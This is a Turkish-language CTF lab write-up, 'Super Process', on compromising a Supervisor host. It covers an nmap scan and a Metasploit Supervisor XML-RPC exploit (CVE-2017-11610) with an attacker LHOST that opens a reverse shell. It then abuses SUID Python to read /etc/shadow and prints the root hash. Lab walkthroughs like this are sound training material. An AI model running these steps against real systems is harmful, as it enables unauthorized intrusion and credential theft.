# Super Process - CTF Writeup

## Çözüm Özeti
- **Hedef IP:** `172.20.5.30`
- **İşletim Sistemi:** Linux (Debian)
- **Kullanılan Zafiyetler:** Supervisor XML-RPC Remote Code Execution (`CVE-2017-11610`), SUID Python 2.7 İle Yetki Yükseltme (Privilege Escalation)

---

## 1. Keşif Aşaması (Reconnaissance)

İlk aşamada hedef sistem üzerindeki açık portları ve çalışan servisleri tespit etmek amacıyla Nmap taraması gerçekleştirilmiştir:

```bash
nmap -sC -sV -T4 172.20.5.30
```

![Nmap Taraması](1.png)

Taramada tespit edilen açık portlar:
- **22/tcp:** SSH (OpenSSH 8.4p1 Debian)
- **9001/tcp:** HTTP - Medusa httpd 1.12 (Supervisor process manager)

Daha detaylı analiz için `9001` portuna özel versiyon taraması yapılmıştır:

```bash
nmap -p 9001 -sC -sV -T4 172.20.5.30
```

![Nmap 9001 Port Taraması](2.png)

Tarama sonucunda 9001 portunda **Supervisor Process Manager** web arayüzünün çalıştığı doğrulanmıştır. Tarayıcı üzerinden `http://172.20.5.30:9001` adresine gidildiğinde Supervisor kontrol paneline ulaşılmıştır:

![Supervisor Web Arayüzü](3.png)

---

## 2. İstismar Aşaması (Exploitation)

Supervisor servisinin bilinen zafiyetlerini araştırmak amacıyla Metasploit Framework (`msfconsole`) üzerinde arama yapılmıştır:

```bash
msfconsole
msf > search supervisor
```

![Metasploit Arama](4.jpg)

Arama sonucunda `exploit/linux/http/supervisor_xmlrpc_exec` modülü tespit edilmiştir. Bu modül, Supervisor servisinin XML-RPC arayüzündeki yetkisiz/yetkili RCE (Remote Code Execution) zafiyetini sömürerek komut çalıştırmaya imkan tanır.

Exploit modülü seçilip gerekli `RHOSTS` ve `LHOST` parametreleri yapılandırılmıştır:

```bash
use exploit/linux/http/supervisor_xmlrpc_exec
set rhosts 172.20.5.30
set lhost 10.8.136.22
exploit -j -z
```

![Metasploit Exploit](5.jpg)

Zafiyetli XML-RPC endpoint'ine (`172.20.5.30:9001/RPC2`) gönderilen payload ile hedef sistem üzerinde ilk erişim (shell) başarıyla elde edilmiştir.

---

## 3. Yetki Yükseltme Aşaması (Privilege Escalation)

Sistem içerisinde yetki yükseltme (Privilege Escalation) vektörlerini tespit etmek için SUID biti atanmış dosyalar taranmıştır:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SUID Taraması](7.png)

Yapılan incelemede standart sistem araçlarının yanında `/usr/bin/python2.7` ikili dosyasının üzerinde SUID bitinin aktif olduğu (`-rwsr-xr-x`) görülmüştür.

GTFOBins referans kataloğu incelendiğinde, SUID yetkisine sahip bir Python ortamıyla sistemdeki hassas dosyaların okunabileceği veya yetkili kabuk açılabileceği doğrulanmıştır:

![GTFOBins Python SUID](8.png)

Python SUID yetkisi kullanılarak yetkili kullanıcı dosyası olan `/etc/shadow` okunmuştur:

```bash
python -c 'print(open("/etc/shadow").read())'
```

![Shadow Dosyası Okuma](9.png)

Elde edilen `root` kullanıcısına ait parola hash değeri:

```text
root:$y$j9T$e8KohoZuo9Aaj1SpH7/pm1$mu9eKYYcNlRPCJ51dW8d71.aPH0ceBM0AKxAaiil7C5:19640:0:99999:7:::
```

Bu hash kırılabilir ya da Python SUID yetkisi üzerinden doğrudan root kabuğu alınarak makine tamamlanabilir.